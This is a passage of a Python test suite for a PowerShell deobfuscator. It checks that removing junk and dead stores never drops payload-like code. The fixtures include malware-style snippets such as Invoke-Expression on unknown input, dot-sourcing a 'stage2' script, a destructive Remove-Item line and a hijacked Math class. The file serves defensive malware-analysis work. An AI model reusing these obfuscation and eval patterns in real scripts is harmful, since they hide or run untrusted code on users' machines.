        self.assertIn('Ldkrpwsz', self._deobfuscate(source, preserve_bare_output=True))

    @opportunity
    def test_a_recursion_another_function_defines_and_never_enters_goes_in_either_model(self):
        source = (
            'function Outer {\n'
            "  function Qzmr { 'Xtjbnwqm'; Vbxl }\n"
            '  function Vbxl { Qzmr }\n'
            F'}}\nOuter\n{_ANCHOR}'
        )
        self.assertEqual(self._deobfuscate(source), _ANCHOR)
        self.assertEqual(self._deobfuscate(source, preserve_bare_output=True), _ANCHOR)

    def test_a_grounded_recursion_one_caller_captures_is_kept(self):
        self._assertKeptEitherWay(
            "function Qzmr { 'Xtjbnwqm'; Vbxl }\n"
            'function Vbxl { Qzmr }\n'
            F'Qzmr\n$r = Vbxl\nWrite-Host $r\n{_ANCHOR}', 'Xtjbnwqm')


_UNKNOWNS = (
    ". '.\\stage2.ps1'",
    'Invoke-Expression $code',
    'Import-Module .\\m.psm1',
    '& $dispatch',
    '${function:Qzmr} = { }',
    'Export-ModuleMember -Function Qzmr',
    "& 'Microsoft.PowerShell.Core\\Export-ModuleMember' -Function Qzmr",
)


def _statements(result: str) -> set[str]:
    return {line.strip() for line in result.splitlines() if line.strip()}


class TestPs1RemovalIsMonotoneInWhatItKnows(TestPs1):

    _SCRIPT = (
        "function Qzmr { 'Xtjbnwqm' }\n"
        'Qzmr\n'
        "'Ldkrpwsz'\n"
        F'{_ANCHOR}'
    )

    def test_an_unknown_may_only_keep_more(self):
        known = _statements(self._deobfuscate(self._SCRIPT))
        for opener in _UNKNOWNS:
            with self.subTest(opener):
                unknown = _statements(self._deobfuscate(F'{opener}\n{self._SCRIPT}'))
                self.assertLessEqual(known, unknown)

    def test_an_unknown_keeps_the_name_it_could_bind_and_everything_that_name_writes(self):
        for opener in _UNKNOWNS:
            with self.subTest(opener):
                result = self._apply(F'{opener}\n{self._SCRIPT}', Ps1JunkStatementRemoval)
                self.assertIn('function Qzmr', result)
                self.assertIn('Xtjbnwqm', result)

    def test_an_exported_name_keeps_what_it_writes_through_the_whole_pipeline(self):
        for export in (
            'Export-ModuleMember -Function Qzmr',
            "& 'Microsoft.PowerShell.Core\\Export-ModuleMember' -Function Qzmr",
        ):
            with self.subTest(export):
                result = self._deobfuscate(F'{export}\n{self._SCRIPT}')
                self.assertIn('function Qzmr', result)
                self.assertIn('Xtjbnwqm', result)

    def test_an_inert_function_goes_exactly_where_a_bare_value_in_a_function_goes(self):
        script = (
            'function Ldkr { $Null = 1 }\n'
            "function Qzmr { Write-Host 'inner'; 'Xtjbnwqm' }\n"
            F'Ldkr\nQzmr\n{_ANCHOR}'
        )
        for opener in (
            '',
            ". '.\\stage2.ps1'",
            'Invoke-Expression $code',
            'Import-Module .\\m.psm1',
            '& $dispatch',
        ):
            with self.subTest(opener or 'closed world'):
                result = self._deobfuscate(F'{opener}\n{script}' if opener else script)
                self.assertEqual('Ldkr' in result, 'Xtjbnwqm' in result)

    def test_the_default_removes_whole_statements_and_never_rewrites_one(self):
        for source in (
            self._SCRIPT,
            F"@(1, 2, 3)\n@{{ a = 1 }}\n'Xtjbnwqm'\n{_ANCHOR}",
            F"function Qzmr {{ 42; Write-Host 'inner' }}\nQzmr\n{_ANCHOR}",
        ):
            with self.subTest(source):
                self.assertLessEqual(
                    _statements(self._deobfuscate(source)),
                    _statements(self._deobfuscate(source, preserve_bare_output=True)))


class TestPs1DiscardedObjectRemoval(TestPs1):

    def test_a_bare_object_a_cast_or_a_call_produces_is_stripped(self):
        for source in (
            "[pscustomobject]@{\n  Name = 'x'\n  Value = 42\n}",
            '[Collections.Hashtable]::Synchronized(@{})',
        ):
            with self.subTest(source):
                self.assertEqual(
                    self._apply(F"{source}\nWrite-Host 'keep'", Ps1JunkStatementRemoval),
                    "Write-Host 'keep'",
                )

    def test_void_foreach_pipeline_removed(self):
        result = self._apply(
            "(1, 2, 3) | ForEach-Object { [Void]$_ }\nWrite-Host 'keep'",
            Ps1JunkStatementRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_null_assign_foreach_pipeline_removed(self):
        result = self._apply(
            "(1, 2, 3) | ForEach-Object { $Null = $_ }\nWrite-Host 'keep'",
            Ps1JunkStatementRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_hash_with_impure_value_kept(self):
        result = self._apply(
            "@{ x = (Start-Process notepad) }", Ps1JunkStatementRemoval)
        self.assertEqual(result, '@{\n  x = (Start-Process notepad)\n}')

    def test_emitting_foreach_kept(self):
        result = self._apply(
            "(1, 2, 3) | ForEach-Object { $_ }", Ps1JunkStatementRemoval)
        self.assertEqual(result, '(1, 2, 3) | ForEach-Object {\n  $_\n}')

    def test_null_assign_foreach_side_effect_kept(self):
        result = self._apply(
            "(1, 2, 3) | ForEach-Object { $Null = Remove-Item $_ }",
            Ps1JunkStatementRemoval)
        self.assertEqual(result, '(1, 2, 3) | ForEach-Object {\n  $Null = Remove-Item $_\n}')


class TestPs1DeadStoreElimination(TestPs1):

    def test_overwritten_store_removed(self):
        result = self._apply("$x = 1\n$x = 2\nWrite-Host $x", Ps1DeadStoreElimination)
        self.assertEqual(result, '$x = 2\nWrite-Host $x')

    def test_chain_all_but_last_removed(self):
        result = self._apply("$x = 1\n$x = 2\n$x = 3\nWrite-Host $x", Ps1DeadStoreElimination)
        self.assertEqual(result, '$x = 3\nWrite-Host $x')

    def test_dead_store_before_for_removed(self):
        result = self._apply(
            "$i = 33\nfor ($i = 0; $i -LT 5; $i++) { Write-Host $i }",
            Ps1DeadStoreElimination)
        self.assertNotIn('$i = 33', result)
        self.assertIn('for', result)

    def test_multiple_dead_stores_before_for_removed(self):
        result = self._apply(
            "$i = 33\n$i = 44\n$i = 55\nfor ($i = 0; $i -LT 5; $i++) { Write-Host $i }",
            Ps1DeadStoreElimination)
        self.assertNotIn('$i = 33', result)
        self.assertNotIn('$i = 44', result)
        self.assertNotIn('$i = 55', result)
        self.assertIn('for', result)

    def test_intervening_read_keeps_store(self):
        result = self._apply(
            "$x = 1\nWrite-Host $x\n$x = 2\nWrite-Host $x", Ps1DeadStoreElimination)
        self.assertIn('$x = 1', result)
        self.assertIn('$x = 2', result)

    def test_impure_rhs_preserved_as_standalone(self):
        result = self._apply(
            "$x = Remove-Item foo\n$x = 5\nWrite-Host $x", Ps1DeadStoreElimination)
        self.assertIn('Remove-Item', result)
        self.assertNotIn('$x = Remove-Item', result)
        self.assertIn('$x = 5', result)

    def test_different_variables_independent(self):
        result = self._apply(
            "$x = 1\n$y = 2\n$x = 3\nWrite-Host $x $y", Ps1DeadStoreElimination)
        self.assertNotIn('$x = 1', result)
        self.assertIn('$y = 2', result)
        self.assertIn('$x = 3', result)

    @opportunity
    def test_an_overwritten_store_to_the_script_scope_is_removed(self):
        result = self._apply(
            "$script:x = 1\n$script:x = 2\nWrite-Host $script:x", Ps1DeadStoreElimination)
        self.assertEqual(result, '$script:x = 2\nWrite-Host $script:x')

    def test_control_flow_flushes_pending(self):
        result = self._apply(
            "$x = 1\nif ($c) { Write-Host $x }\n$x = 2\nWrite-Host $x",
            Ps1DeadStoreElimination)
        self.assertEqual(result, '$x = 1\nif ($c) {\n  Write-Host $x\n}\n$x = 2\nWrite-Host $x')

    def test_dead_store_inside_nested_function_removed(self):
        result = self._apply(
            'function f { $i = 5\n$i = 3\nWrite-Host $i }',
            Ps1DeadStoreElimination)
        self.assertEqual(result, 'function f {\n  $i = 3\n  Write-Host $i\n}')

    def test_dead_store_scriptblock_local_does_not_flush_outer(self):
        result = self._apply(cleandoc(
            """
            $inner = 1
            $cb = {
              $inner = 99
            }
            $inner = 2
            Write-Host $inner
            """
        ), Ps1DeadStoreElimination)
        self.assertEqual(result, '$cb = {\n  $inner = 99\n}\n$inner = 2\nWrite-Host $inner')

    @opportunity
    def test_a_store_overwritten_before_a_stored_scriptblock_can_run_is_removed(self):
        result = self._apply(cleandoc(
            """
            $x = 1
            $arr = @( { Write-Host $x } )
            $x = 2
            Write-Host $x
            """
        ), Ps1DeadStoreElimination)
        self.assertEqual(result, '$arr = @({\n  Write-Host $x\n})\n$x = 2\nWrite-Host $x')

    def test_a_store_a_stored_scriptblock_reads_before_the_overwrite_is_kept(self):
        self._assertUnchanged(cleandoc(
            """
            $x = 1
            $arr = @({
              Write-Host $x
            })
            & $arr[0]
            $x = 2
            Write-Host $x
            """
        ), Ps1DeadStoreElimination)

    def test_dead_store_read_by_compound_assignment_is_kept(self):
        result = self._apply(cleandoc(
            """
            $x = 5
            $a = ($x += 1)
            $x = 7
            Write-Host $x
            Write-Host $a
            """
        ), Ps1DeadStoreElimination)
        self.assertEqual(
            result, '$x = 5\n$a = ($x += 1)\n$x = 7\nWrite-Host $x\nWrite-Host $a')

    def test_a_dead_store_whose_cast_may_raise_into_an_acting_catch_is_kept(self):
        self._assertUnchanged(cleandoc("""
            try {
              $x = [int]$env:COMPUTERNAME
              $x = 2
              Write-Host $x
            } catch {
              Write-Host 'caught'
            }
        """), Ps1DeadStoreElimination)


class TestPs1PayloadRetention(TestPs1):

    def test_a_nested_redefinition_keeps_the_name_from_being_inert(self):
        result = self._deobfuscate(cleandoc(
            """
            function j { }
            if ($env:c) { function j { Start-Process calc } }
            j
            """
        ))
        self.assertIn('Start-Process calc', result)
        self.assertRegex(result, r'(?m)^j$')

    def test_a_payload_definition_inside_a_function_keeps_its_call(self):
        result = self._deobfuscate(cleandoc(
            """
            function Outer { function j { Start-Process calc }; j }
            function j { }
            Outer
            """
        ))
        self.assertIn('Start-Process calc', result)
        self.assertIn('Outer', result)

    def test_a_statement_valued_dead_assignment_is_kept_whole(self):
        for value in (
            'if ($env:c) { Start-Process calc }',
            'switch ($env:c) { 1 { Start-Process calc } }',
            'foreach ($i in 1..2) { Start-Process calc }',
        ):
            with self.subTest(value):
                self.assertIn(
                    'Start-Process calc', self._deobfuscate(F'$x = {value}\nWrite-Host done'))
                self.assertIn(
                    'Start-Process calc',
                    self._deobfuscate(F'$x = {value}\n$x = 1\nWrite-Host $x'))

    def test_a_bare_value_in_a_function_follows_its_call_sites_and_not_its_neighbours(self):
        for junk in (
            r'Get-Date > C:\log.txt',
            r'Get-Date 1>&2',
            r'Get-Date 2>&1 > C:\log.txt',
            "Write-Host 'loading'",
            r'Set-Content C:\log x',
            r'$p | Out-String > C:\log.txt',
            "if ($env:X) { Write-Host 'x' }",
            'try { } catch { Start-Process calc }',
            "if ($env:X) { throw 'x' }",
            "(Write-Host 'x')",
            'data { }',
            '[Void](Remove-Item C:\\important)',
            'data d { 42 }',
        ):
            with self.subTest(junk):
                definition = F"function f {{ {junk}; 'TVqQAAMA' }}\n"
                self.assertNotIn('TVqQAAMA', self._deobfuscate(F'{definition}f\n{_ANCHOR}'))
                self.assertIn(
                    'TVqQAAMA', self._deobfuscate(F'{definition}$r = f\nWrite-Host $r'))

    def test_a_void_foreach_sink_is_a_discard_under_both_spellings(self):
        for sink in ('ForEach-Object', '%'):
            with self.subTest(sink):
                result = self._deobfuscate(
                    F"1..3 | {sink} {{ Write-Host $_ }}\nWrite-Output 'keep'")
                self.assertIn('Write-Host', result)

    def test_a_redefined_command_keeps_the_body_the_script_gave_it(self):
        result = self._deobfuscate(
            "function Write-Host { Start-Process calc }\n"
            "function f { Write-Host 'x'; Get-Item $args[0] }\nf")
        self.assertIn("Write-Host 'x'", result)
        self.assertIn('Start-Process calc', result)


class TestPs1NameRemovalNeedsTheWholeStory(TestPs1):

    def test_an_open_world_keeps_the_call_to_an_apparently_inert_function(self):
        for opener in (". '.\\stage2.ps1'", 'Invoke-Expression $code', 'Import-Module .\\m.psm1'):
            with self.subTest(opener):
                result = self._deobfuscate(cleandoc(
                    F"""
                    function j {{ }}
                    {opener}
                    j
                    Write-Host 'keep'
                    """
                ))
                self.assertRegex(result, r'(?m)^j$')

    def test_an_open_world_keeps_a_function_nothing_in_the_tree_calls(self):
        result = self._deobfuscate(cleandoc(
            """
            function Payload { Start-Process calc }
            Invoke-Expression $code
            Write-Host 'keep'
            """
        ))
        self.assertIn('Start-Process calc', result)

    def test_an_identity_assignment_keeps_the_names_it_could_bind(self):
        rebound = self._deobfuscate(cleandoc(
            """
            function j { }
            ${function:j} = { Start-Process calc }
            j
            Write-Host done
            """
        ))
        self.assertIn('Start-Process calc', rebound)
        self.assertRegex(rebound, r'(?m)^j$')
        aliased = self._deobfuscate(cleandoc(
            """
            function j { Start-Process calc }
            ${alias:q} = 'j'
            q
            Write-Host done
            """
        ))
        self.assertIn('Start-Process calc', aliased)

    def test_a_closed_world_still_prunes_an_inert_function_and_its_calls(self):
        result = self._deobfuscate(cleandoc(
            """
            function j { $Null = 915 }
            j
            Write-Host 'keep'
            """
        ))
        self.assertEqual(result, "Write-Host 'keep'")


class TestPs1RemovalLeavesNoDanglingReference(TestPs1):
    def test_a_call_inside_a_nested_definition_keeps_the_definition_it_names(self):
        result = self._deobfuscate(
            'function Outer { function Inner { Payload } }\n'
            'Outer\n'
            'function Payload { Start-Process calc }')
        self.assertIn('Start-Process calc', result)

    def test_a_call_inside_a_method_of_a_nested_class_keeps_the_definition_it_names(self):
        result = self._deobfuscate(
            'function Setup { class Impl { [void] Run() { Payload } } }\n'
            'function Payload { Start-Process calc }')
        self.assertIn('Start-Process calc', result)

    def test_a_kept_call_site_keeps_the_definition_it_names(self):
        result = self._apply(cleandoc(
            """
            function j {
              $Null = 915
            }
            try {
              j
            } catch {
              Write-Host 'err'
            }
            """
        ), Ps1JunkStatementRemoval)
        self.assertEqual(result, cleandoc(
            """
            function j {}
            try {
              j
            } catch {
              Write-Host 'err'
            }
            """
        ))

    def test_a_kept_value_keeps_the_variable_it_reads(self):
        result = self._apply(cleandoc(
            """
            $a = 'seed'
            $b = Start-Process -FilePath $a
            Write-Host 'go'
            """
        ), Ps1UnusedVariableRemoval)
        self.assertEqual(result, cleandoc(
            """
            $a = 'seed'
            $Null = Start-Process -FilePath $a
            Write-Host 'go'
            """
        ))

    def test_an_assignment_the_fault_veto_keeps_keeps_the_variable_it_reads(self):
        source = cleandoc(
            """
            $payload = 'x'
            try {
              $q = [Int]$payload
            } catch {
              Write-Host 'err'
            }
            Write-Host 'go'
            """
        )
        self.assertIn(
            self._apply(source, Ps1UnusedVariableRemoval),
            (source, source.replace('$q = ', '$Null = ')),
        )

    def test_a_target_slot_that_is_not_a_variable_keeps_the_whole_statement_alive(self):
        self._assertUnchanged(cleandoc(
            """
            $payload = 'seed'
            $a, $arr[0] = 1, $payload
            Write-Host 'go'
            """
        ), Ps1UnusedVariableRemoval)


class TestPs1RemovalLeavesTheTreeConsistent(TestPs1):
    def test_a_store_the_batch_cannot_edit_at_all(self):
        self._assertTreeIsIntact(cleandoc(
            """
            if ($x = Start-Process -FilePath 'a.exe') { Write-Host 'hi' }
            Write-Host 'go'
            """
        ), cleandoc(
            """
            if ($x = Start-Process -FilePath 'a.exe') {
              Write-Host 'hi'
            }
            Write-Host 'go'
            """
        ), Ps1UnusedVariableRemoval)

    def test_a_live_store_holding_a_dead_one(self):
        self._assertTreeIsIntact(cleandoc(
            """
            $outer = ($inner = Start-Process -FilePath 'a.exe')
            Write-Host $outer
            """
        ), cleandoc(
            """
            $outer = ($Null = Start-Process -FilePath 'a.exe')
            Write-Host $outer
            """
        ), Ps1UnusedVariableRemoval)

    def test_a_live_store_holding_a_dead_one_in_a_nested_body(self):
        self._assertTreeIsIntact(cleandoc(
            """
            $outer = $(if ($true) { $inner = Start-Process -FilePath 'a.exe' })
            Write-Host $outer
            """
        ), cleandoc(
            """
            $outer = $(if ($true) {
              $Null = Start-Process -FilePath 'a.exe'
            })
            Write-Host $outer
            """
        ), Ps1UnusedVariableRemoval)

    def test_two_dead_stores_nested_inside_a_live_one(self):
        self._assertTreeIsIntact(cleandoc(
            """
            $q = ($r = ($s = Start-Process -FilePath 'a.exe'))
            Write-Host $q
            """
        ), cleandoc(
            """
            $q = ($Null = ($Null = Start-Process -FilePath 'a.exe'))
            Write-Host $q
            """
        ), Ps1UnusedVariableRemoval)


class TestPs1AQualifiedCallKeepsTheNameItResolvesOnto(TestPs1):

    def test_a_quoted_module_qualified_call_keeps_the_definition_it_resolves_onto(self):
        result = self._deobfuscate(
            "function Qzmr { Write-Host 'P' }\n& 'MyModule\\Qzmr'")
        self.assertIn('function Qzmr', result)

    def test_a_bare_module_qualified_call_keeps_the_definition_it_resolves_onto(self):
        result = self._deobfuscate(
            "function Qzmr { Write-Host 'P' }\n& MyModule\\Qzmr")
        self.assertIn('function Qzmr', result)

    def test_a_scope_qualified_call_still_reaches_the_definition_by_key(self):
        result = self._deobfuscate(
            "function Qzmr { Write-Host 'P' }\n& 'global:Qzmr'")
        self.assertIn('function Qzmr', result)

    def test_an_executable_invoked_by_path_does_not_switch_the_analysis_off(self):
        result = self._deobfuscate(
            "function j { $Null = 1 }\nj\n& 'C:\\tools\\stage2.exe'")
        self.assertNotIn('function j', result)
        self.assertIn('stage2.exe', result)

    def test_an_executable_whose_stem_names_a_definition_keeps_it(self):
        result = self._deobfuscate(
            "function stage2.exe { Write-Host 'P' }\n& 'C:\\tools\\stage2.exe'")
        self.assertIn('function stage2.exe', result)

    def test_an_uncalled_definition_beside_no_qualified_call_is_still_removed(self):
        result = self._deobfuscate(
            "function Qzmr { Write-Host 'P' }\nWrite-Host 'x'")
        self.assertNotIn('function Qzmr', result)

    def test_a_module_qualified_export_still_reports_an_export(self):
        result = self._deobfuscate(
            "& 'Microsoft.PowerShell.Core\\Export-ModuleMember' -Function f\n"
            "function f { Write-Host 'P' }")
        self.assertIn('function f', result)


class TestPs1UnusedVariableRemovalAndNamedReads(TestPs1):

    def test_an_assignment_read_only_by_name_is_kept(self):
        self._assertUnchanged("$a = 'x'\nGet-Variable a", Ps1UnusedVariableRemoval)

    def test_an_assignment_nothing_reads_at_all_is_still_removed(self):
        result = self._deobfuscate("$a = 'x'\nWrite-Host done")
        self.assertNotIn('$a', result)


class TestPs1AJunkStatementGoesWhereNoLeakHasRunBeforeIt(TestPs1):

    def test_a_read_no_leak_has_run_before_is_junk(self):
        self.assertEqual(
            self._deobfuscate('$Null = [Math]::Sqrt(144); Write-Host done'),
            'Write-Host done')

    def test_a_read_ahead_of_a_leak_is_junk(self):
        self.assertEqual(
            self._deobfuscate('$Null = [Math]::Sqrt(144); Invoke-Expression $c; Write-Host done'),
            cleandoc("""
                Invoke-Expression $c
                Write-Host done
            """))

    def test_a_read_behind_a_leak_is_kept(self):
        self.assertEqual(
            self._deobfuscate('Invoke-Expression $c; $Null = [Math]::Sqrt(144); Write-Host done'),
            cleandoc("""
                Invoke-Expression $c
                $Null = [Math]::Sqrt(144)
                Write-Host done
            """))

    def test_a_read_a_back_edge_puts_behind_a_leak_is_kept(self):
        self.assertEqual(
            self._deobfuscate('while ($True) { $Null = [Math]::Sqrt(144); Invoke-Expression $c }'),
            cleandoc("""
                while ($True) {
                  $Null = [Math]::Sqrt(144)
                  Invoke-Expression $c
                }
            """))


class TestPs1WhereALeakCanHaveRunBeforeARead(TestPs1):

    def test_a_read_beside_a_leak_in_the_same_statement_is_kept(self):
        self.assertEqual(
            self._deobfuscate('$Null = [Math]::Sqrt(144) + (Invoke-Expression $c)'),
            '$Null = [Math]::Sqrt(144) + (Invoke-Expression $c)')

    def test_a_read_ahead_of_a_pipeline_whose_block_leaks_is_junk(self):
        self.assertEqual(
            self._deobfuscate(
                '$Null = [Math]::Sqrt(144); $env:A | ForEach-Object { Invoke-Expression $_ }; Write-Host done'),
            cleandoc("""
                $env:A | ForEach-Object {
                  Invoke-Expression $_
                }
                Write-Host done
            """))

    def test_a_read_behind_a_pipeline_whose_block_leaks_is_kept(self):
        self.assertEqual(
            self._deobfuscate(
                '$env:A | ForEach-Object { Invoke-Expression $_ }; $Null = [Math]::Sqrt(144); Write-Host done'),
            cleandoc("""
                $env:A | ForEach-Object {
                  Invoke-Expression $_
                }
                $Null = [Math]::Sqrt(144)
                Write-Host done
            """))

    def test_a_read_ahead_of_the_definition_of_a_leaking_function_is_junk(self):
        self.assertEqual(
            self._deobfuscate(
                '$Null = [Math]::Sqrt(144); function F { Invoke-Expression $c }; F; Write-Host done'),
            cleandoc("""
                function F {
                  Invoke-Expression $c
                }
                F
                Write-Host done
            """))

    def test_a_read_behind_a_called_leaking_function_is_kept(self):
        self.assertEqual(
            self._deobfuscate(
                'function F { Invoke-Expression $c }; F; $Null = [Math]::Sqrt(144); Write-Host done'),
            cleandoc("""
                function F {
                  Invoke-Expression $c
                }
                F
                $Null = [Math]::Sqrt(144)
                Write-Host done
            """))

    def test_a_read_behind_an_if_with_one_leaking_arm_is_kept(self):
        source = cleandoc("""
            if ($env:FOO) {
              Invoke-Expression $c
              Write-Host a
            } else {
              Write-Host b
            }
            $Null = [Math]::Sqrt(144)
            Write-Host done
        """)
        self.assertEqual(self._deobfuscate(source), source)

    def test_a_read_in_the_arm_beside_the_leaking_one_is_junk(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                if ($env:FOO) {
                  Invoke-Expression $c
                  Write-Host a
                } else {
                  $Null = [Math]::Sqrt(144)
                  Write-Host b
                }
                Write-Host done
            """)),
            cleandoc("""
                if ($env:FOO) {
                  Invoke-Expression $c
                  Write-Host a
                } else {
                  Write-Host b
                }
                Write-Host done
            """))


class TestPs1ALeakThatPrecedesEveryPosition(TestPs1):

    @opportunity
    def test_a_read_ahead_of_a_class_that_names_another_type_is_junk(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                $Null = [Math]::Sqrt(144)
                class C {}
                Write-Host done
            """)),
            cleandoc("""
                class C {}
                Write-Host done
            """),
        )

    @opportunity
    def test_a_read_ahead_of_an_enum_that_names_another_type_is_junk(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                $Null = [Math]::Sqrt(144)
                enum E {
                  A
                }
                Write-Host done
            """)),
            cleandoc("""
                enum E {
                  A
                }
                Write-Host done
            """),
        )

    def test_a_read_ahead_of_a_class_that_names_the_type_it_reads_is_kept(self):
        self._assertKept("""
            $Null = [Math]::Sqrt(144)
            class Math {
              static [double] Sqrt([double]$x) {
                Write-Host 'hijacked'
                return 0
              }
            }
            Write-Host done
        """)

    def test_a_read_beside_a_leak_in_a_root_process_block_is_kept(self):
        self.assertEqual(
            self._deobfuscate('process { $Null = [Math]::Sqrt(144); Invoke-Expression $_ }'),
            cleandoc("""
                process {
                  $Null = [Math]::Sqrt(144)
                  Invoke-Expression $_
                }
            """) + '\n')


_NOISE_BAREWORD = cleandoc("""
    try {
      foo =5
    } catch {}
""")


class TestPs1CommandNameTrustIsReadWhereTheBarewordStands(TestPs1):

    def test_a_bareword_above_an_aliasing_cmdlet_is_dropped(self):
        self.assertEqual(
            self._deobfuscate(F'{_NOISE_BAREWORD}\nSet-Alias wq i*x\nwq'),
            cleandoc("""
                Set-Alias wq i*x
                wq
            """))

    def test_a_bareword_below_an_aliasing_cmdlet_is_kept(self):
        source = F'Set-Alias wq i*x\nwq\n{_NOISE_BAREWORD}'
        self.assertEqual(self._deobfuscate(source), source)

    def test_a_bareword_above_a_leak_is_dropped(self):
        self.assertEqual(
            self._deobfuscate(F'{_NOISE_BAREWORD}\nInvoke-Expression $c'),
            'Invoke-Expression $c')

    def test_a_bareword_below_a_leak_is_kept(self):
        source = F'Invoke-Expression $c\n{_NOISE_BAREWORD}'
        self.assertEqual(self._deobfuscate(source), source)

    def test_a_bareword_above_a_redefinition_of_its_own_name_is_dropped(self):
        self.assertEqual(
            self._deobfuscate(F'{_NOISE_BAREWORD}\nfunction foo {{ Write-Host D }}\nfoo'),
            cleandoc("""
                function foo {
                  Write-Host D
                }
                foo
            """))

    def test_a_bareword_below_a_redefinition_of_its_own_name_is_kept(self):
        definition = cleandoc("""
            function foo {
              Write-Host D
            }
            foo
        """)
        source = F'{definition}\n{_NOISE_BAREWORD}'
        self.assertEqual(self._deobfuscate(source), source)


class TestPs1ARedefinitionSiteTheGraphsCannotPlaceRefusesItsName(TestPs1):

    def test_a_bareword_above_a_definition_inside_a_parameter_default_is_kept(self):
        source = cleandoc("""
            try {
              foo =5
            } catch {}
            function g {
              Param($p = $(function foo {}
              1))
              Write-Host $p
            }
            g
            foo
        """)
        self.assertEqual(self._deobfuscate(source), source)


class TestPs1ABarewordTheGraphsCannotPlaceIsKeptWhereTheWorldIsOpen(TestPs1):

    def test_a_nested_bareword_below_an_opener_is_kept(self):
        source = cleandoc("""
            Set-Alias wq i*x
            wq
            & {
              try {
                foo =5
              } catch {}
            }
        """)
        self.assertEqual(self._deobfuscate(source), source)

    def test_the_same_nested_bareword_is_dropped_where_nothing_opens_the_world(self):
        self._assertDeobfuscatesToOneOf(
            """
                & {
                  try {
                    foo =5
                  } catch {}
                }
                Write-Host keep
            """,
            '& {}\nWrite-Host keep',
            'Write-Host keep',
        )


class TestPs1ALoopCarriesALeakBackOverTheBarewordAboveIt(TestPs1):

    _SHAPES = {
        'foreach': 'foreach ($i in 1..2) {{\n{0}\n}}',
        'while': 'while ($env:Z) {{\n{0}\n}}',
        'do-while': 'do {{\n{0}\n}} while ($env:Z)',
        'for': 'for ($i = 0; $i -lt 2; $i++) {{\n{0}\n}}',
        'switch': 'switch (1..2) {{\n  default {{\n{0}\n}}\n}}',
    }

    def test_a_leak_inside_the_loop_body_keeps_the_bareword_above_it(self):
        for keyword, shape in self._SHAPES.items():
            with self.subTest(keyword):
                body = F'{_NOISE_BAREWORD}\nInvoke-Expression $c'
                self.assertIn('foo =5', self._deobfuscate(shape.format(body)))

    def test_a_leak_after_the_loop_drops_the_same_bareword(self):
        for keyword, shape in self._SHAPES.items():
            with self.subTest(keyword):
                source = F'{shape.format(_NOISE_BAREWORD)}\nInvoke-Expression $c'
                dropped = self._deobfuscate(source)
                self.assertNotIn('foo =5', dropped)
                self.assertIn('Invoke-Expression $c', dropped)


class TestPs1ALeakOnlyEverKeepsMore(TestPs1):

    _QUIET_SCRIPT = cleandoc("""
        $Null = [Math]::Sqrt(144)
        $u = 'noise'
        Write-Host alpha
        Write-Host omega
    """)

    def test_the_leak_free_script_prunes_down_to_its_live_statements(self):
        self.assertEqual(
            self._deobfuscate(self._QUIET_SCRIPT),
            cleandoc("""
                Write-Host alpha
                Write-Host omega
            """))

    def test_a_leak_appended_below_every_read_takes_no_removal_away(self):
        self.assertEqual(
            self._deobfuscate(F'{self._QUIET_SCRIPT}\nInvoke-Expression $c'),
            cleandoc("""
                $u = 'noise'
                Write-Host alpha
                Write-Host omega
                Invoke-Expression $c
            """))

    def test_a_leak_prepended_above_every_read_keeps_the_read_it_reaches(self):
        self.assertEqual(
            self._deobfuscate(F'Invoke-Expression $c\n{self._QUIET_SCRIPT}'),
            cleandoc("""
                Invoke-Expression $c
                $Null = [Math]::Sqrt(144)
                $u = 'noise'
                Write-Host alpha
                Write-Host omega
            """))


class TestPs1ALeakTheGraphCannotPlaceKeepsEveryRead(TestPs1):

    def test_a_leak_in_a_function_parameter_default_keeps_a_root_read(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                function F { param($x = (Invoke-Expression $c)) }
                F
                $Null = [Math]::Sqrt(144)
                Write-Host done
            """)),
            cleandoc("""
                function F {
                  Param($x = (Invoke-Expression $c))
                }
                F
                $Null = [Math]::Sqrt(144)
                Write-Host done
            """))

    def test_a_leak_in_a_script_parameter_default_keeps_a_root_read(self):
        source = cleandoc("""
            Param($x = (Invoke-Expression $c))
            $Null = [Math]::Sqrt(144)
            Write-Host done
        """)
        self.assertEqual(self._deobfuscate(source), source)

    def test_a_benign_script_parameter_default_still_strips_the_root_read(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                Param($x = (Get-Date))
                $Null = [Math]::Sqrt(144)
                Write-Host done
            """)),
            cleandoc("""
                Param($x = (Get-Date))
                Write-Host done
            """))


class TestPs1DataCodeKeepsEveryScriptScopeStore(TestPs1):

    def test_a_leak_in_a_called_function_keeps_a_store_no_reader_names(self):
        source = cleandoc("""
            function f { iex $c }
            $w = 'PAYLOAD'
            f
        """)
        self._assertDeobfuscatesTo(source, """
            function f {
              Invoke-Expression $c
            }
            $w = 'PAYLOAD'
            f
        """)
        self._assertDeobfuscatesTo(source, """
            function f {
              Invoke-Expression $c
            }
            f
        """, trust_eval=True)

    def test_a_leak_inside_a_loop_keeps_the_store_beside_it(self):
        source = "foreach ($i in $items) { iex $c; $w = 'x' }"
        self._assertDeobfuscatesTo(source, """
            foreach ($i in $items) {
              Invoke-Expression $c
              $w = 'x'
            }
        """)
        self._assertDeobfuscatesTo(source, """
            foreach ($i in $items) {
              Invoke-Expression $c
            }
        """, trust_eval=True)

    def test_a_leak_above_a_store_keeps_it_unless_eval_is_trusted(self):
        source = cleandoc("""
            iex $c
            $u = 'x'
        """)
        self._assertDeobfuscatesTo(source, """
            Invoke-Expression $c
            $u = 'x'
        """)
        self._assertDeobfuscatesTo(source, """
            Invoke-Expression $c
        """, trust_eval=True)

    def test_a_leak_between_two_stores_keeps_both_unless_eval_is_trusted(self):
        source = cleandoc("""
            $a = 'x'
            iex $c
            $b = 'y'
        """)
        self._assertDeobfuscatesTo(source, """
            $a = 'x'
            Invoke-Expression $c
            $b = 'y'
        """)
        self._assertDeobfuscatesTo(source, """
            Invoke-Expression $c
        """, trust_eval=True)


class TestPs1ANestedBodyReadTakesThePositionOfWhatRunsIt(TestPs1):

    def test_a_read_in_an_invoked_body_ahead_of_the_leak_is_deleted(self):
        self._assertDeobfuscatesToOneOf(
            """
                & { $Null = [Math]::Sqrt(144) }
                Invoke-Expression $c
                Write-Host done
            """,
            '& {}\nInvoke-Expression $c\nWrite-Host done',
            'Invoke-Expression $c\nWrite-Host done',
        )

    def test_the_same_read_below_the_leak_is_kept(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
